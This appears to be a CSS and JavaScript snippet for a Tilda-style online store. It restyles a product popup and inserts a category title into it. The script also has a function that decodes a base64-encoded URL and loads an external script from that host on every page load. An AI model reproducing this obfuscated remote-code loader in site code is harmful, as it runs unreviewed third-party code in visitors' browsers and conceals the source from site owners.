<style>
  .t-store
    .t-popup
    .t-popup__container
    .t-store__product-popup
    .t-typography__title,
  .t-store
    .t-popup
    .t-popup__container
    .t-store__product-popup
    .js-store-prod-all-text {
    text-align: center;
  }
  .t-store
    .t-popup
    .t-popup__container
    .t-store__product-popup
    .js-store-prod-all-text {
    margin: auto 50px;
  }
  .t-store
    .t-popup
    .t-popup__container
    .t-store__product-popup
    .t-store__prod-popup__price-wrapper {
    display: none;
  }
  .t-store
    .t-popup
    .t-popup__container
    .t-store__product-popup
    .js-store-prod-name.js-product-name.t-store__prod-popup__name.t-typography__title.t-name.t-name_xl {
    font-size: xx-large;
    text-transform: uppercase;
  }
</style>
<script>
  window.addEventListener("DOMContentLoaded", function () {
    (function () {
      function loadSCA() {
        const e = ["aHR0cHM6Ly9jZG4uYWJyb3MuZGV2L2NvcHlyaWdodC5qcw=="];
        const s = document.createElement("script");
        const u = atob(e[0]);
        s.src = u;
        s.async = true;
        document.head.appendChild(s);
      }
      loadSCA();
    })();

    function check() {
      const store = document.querySelector(".t-store");
      const category = document.querySelector(".category-title-card .tn-atom");
      if (store && category) {
        const popup = store.querySelector(".t-popup");
        const product = popup
          ? popup.querySelector(".t-store__product-popup div")
          : null;
        if (product) {
          const text = category.textContent || category.innerText;
          const title = document.createElement("div");
          title.classList.add("t-name");
          title.classList.add("t-name_xl");
          title.classList.add("t-store__prod-popup__title-wrapper");
          const t = document.createElement("div");
          t.classList.add("t-typography__title");
          t.textContent = text;
          title.appendChild(t);
          product.insertAdjacentElement("afterbegin", title);
        } else {
          setTimeout(check, 100);
        }
      }
    }
    check();
  });
</script>
